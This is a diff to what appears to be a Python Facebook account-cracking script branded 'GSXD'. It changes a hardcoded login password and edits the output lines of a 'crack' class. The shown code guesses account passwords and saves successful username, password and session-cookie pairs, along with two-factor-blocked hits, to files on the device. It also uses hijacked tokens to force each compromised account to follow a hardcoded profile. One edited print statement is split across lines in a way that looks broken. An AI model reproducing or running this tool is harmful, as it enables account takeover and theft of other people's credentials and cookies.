@@ -221,7 +221,7 @@ while attemps < 12345677901:
     username = input('\033[1;92mUser Name:\033[1;37m ')
     password = input('\033[1;92mPassword:\033[1;37m ')
 
-    if username == '@' and password == '@':    	
+    if username == 'GSXD' and password == 'GSXD':    	
         print('\033[1;92mYou have successfully logged in.')
         break
     else:
@@ -923,7 +923,8 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {cokie} {VV}                ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {cokie} {VV}            
+    ")
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
@@ -931,7 +932,7 @@ class crack:
                         subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
-                        print(f"\r\033[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
+                        #print(f"\r\033[1#;33m[TL-GSXD] {used} | {pw} {VV}    ")
                         tl.append(used + pw)
                         break
                 elif "Login approvals are on" in str(q) or "two_factor" in str(q):
@@ -946,7 +947,7 @@ class crack:
                             used=user
                     if len(used)<11 or len(used)>15:
                         used = user
-                    print(f"\r{Mm}[2F-GSXD] {used} | {pw}{VV}     ")
+                    #print(f"\r{#Mm}[2F-GSXD] {used} | {pw}{VV}     ")
                     open("/sdcard/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
                     f2.append(used + pw)
                     break
